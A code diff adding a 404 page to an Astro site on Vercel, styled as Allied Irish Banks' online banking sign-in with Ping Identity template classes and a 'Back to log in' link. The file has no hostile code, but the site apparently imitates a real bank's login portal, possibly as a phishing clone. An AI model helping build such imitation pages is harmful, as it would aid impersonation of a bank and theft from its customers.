@@ -1,0 +1,65 @@
+---
+/**
+ * `/404` — a real 404 with a real status.
+ *
+ * Without this, Vercel serves its own platform 404 for every unmatched path,
+ * which is an HTML page with no brand, no navigation back and no relationship
+ * to the site. `noindex, follow` keeps error responses out of the index while
+ * still passing link equity to `/`.
+ */
+import Layout from "../layouts/Layout.astro";
+import { NOINDEX_PAGE_ROBOTS, SITE_HOMEPAGE_CANONICAL } from "../lib/site-config.js";
+---
+
+<Layout
+  title="Page not found"
+  canonical={SITE_HOMEPAGE_CANONICAL}
+  robots={NOINDEX_PAGE_ROBOTS}
+  includeKeywords={false}
+  bodyClass="aib_tpl aib-404"
+>
+  <Fragment slot="head">
+    <meta http-equiv="x-ua-compatible" content="IE=edge" />
+    <link rel="stylesheet" href="/css/main.css" />
+  </Fragment>
+
+  <div class="ping-container ping-signin login-template">
+    <header class="ping-header">
+      <span class="company-logo">
+        <img
+          src="/images/aib-logo.png"
+          alt="AIB"
+          width="70"
+          height="70"
+          style="border-radius:8px;background:linear-gradient(45deg,#512d6d 0%,#c42f9e 80%);padding:10px;object-fit:contain;"
+        />
+      </span>
+      <h1>Page not found</h1>
+    </header>
+
+    <div class="ping-body-container">
+      <main>
+        <p class="aib-srp-intro">
+          The page you requested is not available. Return to the AIB online banking
+          login to continue.
+        </p>
+        <div class="ping-buttons" style="margin-top:24px">
+          <a href="/" class="ping-button normal allow" title="Log in" tabindex="0">
+            <span class="ping-btn-label">Back to log in</span>
+          </a>
+        </div>
+      </main>
+    </div>
+
+    <div class="ping-footer-container">
+      <footer class="ping-footer">
+        <div class="aib-credits"></div>
+        <div class="aib-copyright">&copy; 2026 Allied Irish Banks, p.l.c. All rights reserved.</div>
+      </footer>
+    </div>
+  </div>
+</Layout>
+
+<style is:global>
+  .aib-404 .ping-buttons a.ping-button{width:100%;float:none}
+</style>
